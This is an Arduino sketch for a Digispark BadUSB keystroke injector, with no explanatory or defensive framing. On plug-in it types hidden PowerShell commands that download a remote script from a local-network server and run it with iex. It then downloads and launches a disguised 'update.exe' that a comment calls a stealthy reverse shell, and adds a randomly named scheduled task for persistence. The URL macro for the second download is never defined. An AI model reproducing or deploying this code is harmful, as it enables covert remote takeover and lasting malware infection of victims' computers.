#include "DigiKeyboard.h"

// Store the script URL in PROGMEM (flash) to save RAM
static const char scriptURL[] PROGMEM = "http://192.168.137.5:5000/download/payload.ps1";

void setup() {
  DigiKeyboard.delay(2000);

  // Open Run dialog (Win+R)
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  // Print the PowerShell command without storing large strings in RAM
  DigiKeyboard.print(F("powershell -WindowStyle Hidden -Command \"& { iwr "));
  
  // Print the URL from PROGMEM (character by character)
  for (int i = 0; i < strlen_P(scriptURL); i++) {
    DigiKeyboard.print((char)pgm_read_byte(&scriptURL[i]));
  }
  
  DigiKeyboard.print(F(" -UseBasicParsing | iex }\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  // --- Step 3: Stealthy reverse shell execution ---
  DigiKeyboard.print(F("powershell -ep bypass -w hidden -c \""));
  DigiKeyboard.print(F("$wc=New-Object Net.WebClient;$wc.DownloadFile('"));
  DigiKeyboard.print(REVERSE_SHELL_URL);
  DigiKeyboard.print(F("','%TEMP%\\update.exe');Start-Process '%TEMP%\\update.exe' -WindowStyle Hidden"));
  DigiKeyboard.print(F("\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  // --- Step 4: Create persistence with random task name ---
  DigiKeyboard.print(F("powershell -ep bypass -w hidden -c \""));
  DigiKeyboard.print(F("$rn=[guid]::NewGuid().ToString().Substring(0,8);"));
  DigiKeyboard.print(F("schtasks /create /tn \"$rn\" /tr \"%TEMP%\\update.exe\" /sc minute /mo 10 /f"));
  DigiKeyboard.print(F("\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
}

void loop() {}
